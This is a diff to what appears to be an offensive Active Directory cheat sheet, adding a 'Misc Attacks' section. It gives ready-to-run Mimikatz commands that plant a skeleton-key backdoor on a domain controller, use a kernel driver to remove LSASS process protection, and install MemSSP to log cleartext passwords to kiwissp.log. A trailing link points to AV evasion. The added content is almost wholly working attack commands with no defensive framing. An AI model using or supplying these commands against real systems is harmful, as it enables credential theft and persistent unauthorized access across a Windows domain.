@@ -240,6 +240,24 @@ Invoke-Mimikatz -Command '"kerberos::golden
 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
+#### Misc Attacks
+```Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc01.ecorp.local```
+May require Kernel Driverload onto the host if process protected:-
+```
+privilege::debug
+
+!+
+
+!processprotect /process:lsass.exe /remove
+
+misc::skeleton
+
+!-
+```
+ 
+ MemSSP logs local logons, service account and machine account passwords in clear text on the target server:-
+```Invoke-Mimikatz -Command '"misc::memssp"'``` - Logs local logons to C:\Windows\system32\kiwissp.log
+
 
 #### AV Evasion
 https://github.com/mitre/caldera/issues/38#issuecomment-396055260
